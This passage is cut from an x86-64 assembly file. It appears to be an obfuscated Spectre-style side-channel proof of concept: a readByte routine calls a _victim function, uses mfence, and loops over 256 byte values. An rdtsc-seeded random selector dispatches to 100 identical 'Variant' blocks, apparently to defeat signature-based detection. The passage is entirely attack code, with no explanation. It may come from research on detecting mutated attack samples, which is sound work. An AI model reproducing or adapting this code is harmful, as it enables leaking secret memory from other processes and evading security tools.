	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 12
.LreadByte_win6_var12:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 13
.LreadByte_win6_var13:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 14
.LreadByte_win6_var14:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 15
.LreadByte_win6_var15:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 16
.LreadByte_win6_var16:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 17
.LreadByte_win6_var17:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 18
.LreadByte_win6_var18:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 19
.LreadByte_win6_var19:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 20
.LreadByte_win6_var20:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 21
.LreadByte_win6_var21:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 22
.LreadByte_win6_var22:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 23
.LreadByte_win6_var23:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 24
.LreadByte_win6_var24:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 25
.LreadByte_win6_var25:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 26
.LreadByte_win6_var26:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 27
.LreadByte_win6_var27:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 28
.LreadByte_win6_var28:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 29
.LreadByte_win6_var29:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 30
.LreadByte_win6_var30:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 31
.LreadByte_win6_var31:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 32
.LreadByte_win6_var32:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 33
.LreadByte_win6_var33:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 34
.LreadByte_win6_var34:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 35
.LreadByte_win6_var35:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 36
.LreadByte_win6_var36:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 37
.LreadByte_win6_var37:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 38
.LreadByte_win6_var38:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 39
.LreadByte_win6_var39:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 40
.LreadByte_win6_var40:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 41
.LreadByte_win6_var41:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 42
.LreadByte_win6_var42:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 43
.LreadByte_win6_var43:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 44
.LreadByte_win6_var44:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 45
.LreadByte_win6_var45:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 46
.LreadByte_win6_var46:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 47
.LreadByte_win6_var47:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 48
.LreadByte_win6_var48:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 49
.LreadByte_win6_var49:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 50
.LreadByte_win6_var50:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 51
.LreadByte_win6_var51:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 52
.LreadByte_win6_var52:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 53
.LreadByte_win6_var53:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 54
.LreadByte_win6_var54:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 55
.LreadByte_win6_var55:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 56
.LreadByte_win6_var56:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 57
.LreadByte_win6_var57:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 58
.LreadByte_win6_var58:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 59
.LreadByte_win6_var59:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 60
.LreadByte_win6_var60:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 61
.LreadByte_win6_var61:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 62
.LreadByte_win6_var62:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 63
.LreadByte_win6_var63:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 64
.LreadByte_win6_var64:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 65
.LreadByte_win6_var65:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 66
.LreadByte_win6_var66:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 67
.LreadByte_win6_var67:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 68
.LreadByte_win6_var68:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 69
.LreadByte_win6_var69:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 70
.LreadByte_win6_var70:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 71
.LreadByte_win6_var71:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 72
.LreadByte_win6_var72:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 73
.LreadByte_win6_var73:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 74
.LreadByte_win6_var74:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 75
.LreadByte_win6_var75:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 76
.LreadByte_win6_var76:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 77
.LreadByte_win6_var77:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 78
.LreadByte_win6_var78:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 79
.LreadByte_win6_var79:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 80
.LreadByte_win6_var80:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 81
.LreadByte_win6_var81:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 82
.LreadByte_win6_var82:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 83
.LreadByte_win6_var83:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 84
.LreadByte_win6_var84:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 85
.LreadByte_win6_var85:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 86
.LreadByte_win6_var86:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 87
.LreadByte_win6_var87:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 88
.LreadByte_win6_var88:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 89
.LreadByte_win6_var89:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 90
.LreadByte_win6_var90:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 91
.LreadByte_win6_var91:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 92
.LreadByte_win6_var92:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 93
.LreadByte_win6_var93:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 94
.LreadByte_win6_var94:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 95
.LreadByte_win6_var95:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 96
.LreadByte_win6_var96:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 97
.LreadByte_win6_var97:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 98
.LreadByte_win6_var98:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
## Variant 99
.LreadByte_win6_var99:
	popq	%rax
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	jmp	.LreadByte_win6_continue
.LreadByte_win6_continue:
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
## %bb.9:                               ##   in Loop: Header=BB3_7 Depth=2
	movl	-1076(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_7
LBB3_10:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movl	$0, -1072(%rbp)
LBB3_11:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win5_var0
	cmpl	$1, %eax
	je	.LreadByte_win5_var1
	cmpl	$2, %eax
	je	.LreadByte_win5_var2
	cmpl	$3, %eax
	je	.LreadByte_win5_var3
	cmpl	$4, %eax
	je	.LreadByte_win5_var4
	cmpl	$5, %eax
	je	.LreadByte_win5_var5
	cmpl	$6, %eax
	je	.LreadByte_win5_var6
	cmpl	$7, %eax
	je	.LreadByte_win5_var7
	cmpl	$8, %eax
	je	.LreadByte_win5_var8
	cmpl	$9, %eax
	je	.LreadByte_win5_var9
	cmpl	$10, %eax
	je	.LreadByte_win5_var10
	cmpl	$11, %eax
	je	.LreadByte_win5_var11
	cmpl	$12, %eax
	je	.LreadByte_win5_var12
	cmpl	$13, %eax
	je	.LreadByte_win5_var13
	cmpl	$14, %eax
	je	.LreadByte_win5_var14
	cmpl	$15, %eax
	je	.LreadByte_win5_var15
	cmpl	$16, %eax
	je	.LreadByte_win5_var16
	cmpl	$17, %eax
	je	.LreadByte_win5_var17
	cmpl	$18, %eax
	je	.LreadByte_win5_var18
	cmpl	$19, %eax
	je	.LreadByte_win5_var19
	cmpl	$20, %eax
	je	.LreadByte_win5_var20
	cmpl	$21, %eax
	je	.LreadByte_win5_var21
	cmpl	$22, %eax
	je	.LreadByte_win5_var22
	cmpl	$23, %eax
	je	.LreadByte_win5_var23
	cmpl	$24, %eax
	je	.LreadByte_win5_var24
	cmpl	$25, %eax
	je	.LreadByte_win5_var25
	cmpl	$26, %eax
	je	.LreadByte_win5_var26
	cmpl	$27, %eax
	je	.LreadByte_win5_var27
	cmpl	$28, %eax
	je	.LreadByte_win5_var28
	cmpl	$29, %eax
	je	.LreadByte_win5_var29
	cmpl	$30, %eax
	je	.LreadByte_win5_var30
	cmpl	$31, %eax
	je	.LreadByte_win5_var31
	cmpl	$32, %eax
	je	.LreadByte_win5_var32
	cmpl	$33, %eax
	je	.LreadByte_win5_var33
	cmpl	$34, %eax
	je	.LreadByte_win5_var34
	cmpl	$35, %eax
	je	.LreadByte_win5_var35
	cmpl	$36, %eax
	je	.LreadByte_win5_var36
	cmpl	$37, %eax
	je	.LreadByte_win5_var37
	cmpl	$38, %eax
	je	.LreadByte_win5_var38
	cmpl	$39, %eax
	je	.LreadByte_win5_var39
	cmpl	$40, %eax
	je	.LreadByte_win5_var40
	cmpl	$41, %eax
	je	.LreadByte_win5_var41
	cmpl	$42, %eax
	je	.LreadByte_win5_var42
	cmpl	$43, %eax
	je	.LreadByte_win5_var43
	cmpl	$44, %eax
	je	.LreadByte_win5_var44
	cmpl	$45, %eax
	je	.LreadByte_win5_var45
	cmpl	$46, %eax
	je	.LreadByte_win5_var46
	cmpl	$47, %eax
	je	.LreadByte_win5_var47
	cmpl	$48, %eax
	je	.LreadByte_win5_var48
	cmpl	$49, %eax
	je	.LreadByte_win5_var49
	cmpl	$50, %eax
	je	.LreadByte_win5_var50
	cmpl	$51, %eax
	je	.LreadByte_win5_var51
	cmpl	$52, %eax
	je	.LreadByte_win5_var52
	cmpl	$53, %eax
	je	.LreadByte_win5_var53
	cmpl	$54, %eax
	je	.LreadByte_win5_var54
	cmpl	$55, %eax
	je	.LreadByte_win5_var55
	cmpl	$56, %eax
	je	.LreadByte_win5_var56
	cmpl	$57, %eax
	je	.LreadByte_win5_var57
	cmpl	$58, %eax
	je	.LreadByte_win5_var58
	cmpl	$59, %eax
	je	.LreadByte_win5_var59
	cmpl	$60, %eax
	je	.LreadByte_win5_var60
	cmpl	$61, %eax
	je	.LreadByte_win5_var61
	cmpl	$62, %eax
	je	.LreadByte_win5_var62
	cmpl	$63, %eax
	je	.LreadByte_win5_var63
	cmpl	$64, %eax
	je	.LreadByte_win5_var64
	cmpl	$65, %eax
	je	.LreadByte_win5_var65
	cmpl	$66, %eax
	je	.LreadByte_win5_var66
	cmpl	$67, %eax
	je	.LreadByte_win5_var67
	cmpl	$68, %eax
	je	.LreadByte_win5_var68
	cmpl	$69, %eax
	je	.LreadByte_win5_var69
	cmpl	$70, %eax
	je	.LreadByte_win5_var70
	cmpl	$71, %eax
	je	.LreadByte_win5_var71
	cmpl	$72, %eax
	je	.LreadByte_win5_var72
	cmpl	$73, %eax
	je	.LreadByte_win5_var73
	cmpl	$74, %eax
	je	.LreadByte_win5_var74
	cmpl	$75, %eax
	je	.LreadByte_win5_var75
	cmpl	$76, %eax
	je	.LreadByte_win5_var76
	cmpl	$77, %eax
	je	.LreadByte_win5_var77
	cmpl	$78, %eax
	je	.LreadByte_win5_var78
	cmpl	$79, %eax
	je	.LreadByte_win5_var79
	cmpl	$80, %eax
	je	.LreadByte_win5_var80
	cmpl	$81, %eax
	je	.LreadByte_win5_var81
	cmpl	$82, %eax
	je	.LreadByte_win5_var82
	cmpl	$83, %eax
	je	.LreadByte_win5_var83
	cmpl	$84, %eax
	je	.LreadByte_win5_var84
	cmpl	$85, %eax
	je	.LreadByte_win5_var85
	cmpl	$86, %eax
	je	.LreadByte_win5_var86
	cmpl	$87, %eax
	je	.LreadByte_win5_var87
	cmpl	$88, %eax
	je	.LreadByte_win5_var88
	cmpl	$89, %eax
	je	.LreadByte_win5_var89
	cmpl	$90, %eax
	je	.LreadByte_win5_var90
	cmpl	$91, %eax
	je	.LreadByte_win5_var91
	cmpl	$92, %eax
	je	.LreadByte_win5_var92
	cmpl	$93, %eax
	je	.LreadByte_win5_var93
	cmpl	$94, %eax
	je	.LreadByte_win5_var94
	cmpl	$95, %eax
	je	.LreadByte_win5_var95
	cmpl	$96, %eax
	je	.LreadByte_win5_var96
	cmpl	$97, %eax
	je	.LreadByte_win5_var97
	cmpl	$98, %eax
	je	.LreadByte_win5_var98
	cmpl	$99, %eax
	je	.LreadByte_win5_var99
	jmp	.LreadByte_win5_var0
## Variant 0
.LreadByte_win5_var0:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 1
.LreadByte_win5_var1:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	jmp	.LreadByte_win5_continue
## Variant 2
.LreadByte_win5_var2:
	popq	%rax
